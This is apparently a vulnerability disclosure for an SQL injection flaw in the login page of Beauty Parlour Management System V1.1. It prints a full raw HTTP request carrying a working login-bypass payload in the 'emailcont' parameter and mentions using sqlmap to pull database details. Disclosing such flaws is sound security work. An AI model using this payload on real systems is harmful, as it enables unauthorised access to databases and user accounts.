# Beauty Parlour Management System V1.1 SQL Injection Vulnerability
##### Vulnerability Location: /login.php
##### Affected Range: Beauty Parlour Management System V1.1
##### Vulnerability Cause: login.php contains a serious security vulnerability. The manipulation of the argument emailcont leads to sql injection. The attack can be launched remotely.
##### Vulnerability Impact: Obtain database access rights, and even DBA permissions;
##### Link: https://phpgurukul.com/beauty-parlour-management-system-using-php-and-mysql/
# Vulnerability recurrence

This vulnerability does not require login.

<img width="1512" height="873" alt="image" src="https://github.com/user-attachments/assets/3f7cca46-4b77-4e5f-aa93-60e08a9f899b" />

Use BurpSuite to capture the data packets. There is an SQL injection vulnerability in the "emailcont" parameter.

<img width="1206" height="412" alt="image" src="https://github.com/user-attachments/assets/5c90b684-0928-43e4-9d3e-70a3221ff5d5" />

Use sqlmap for automated injection to obtain the current database name.

<img width="1099" height="640" alt="image" src="https://github.com/user-attachments/assets/a627f4c5-e40b-4ecf-b686-7f8931d95b71" />

```
POST /login.php HTTP/1.1
Host: 192.168.2.133:8080
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:149.0) Gecko/20100101 Firefox/149.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.9,zh-TW;q=0.8,zh-HK;q=0.7,en-US;q=0.6,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 44
Origin: http://192.168.2.133:8080
Connection: close
Referer: http://192.168.2.133:8080/login.php
Cookie: PHPSESSID=08egf6l166ui4okapsps1f5236
Upgrade-Insecure-Requests: 1
Priority: u=0, i

emailcont=')+or+1=1--+&password=admin&login=
```

# Code Analysis

The argument: emailcont in /login.php:

<img width="1227" height="558" alt="image" src="https://github.com/user-attachments/assets/8422acf7-ae3a-4da3-ba40-41bba28e4a63" />

Directly inserting the user-provided emailcont into the SQL statement leads to the occurrence of SQL injection vulnerability.
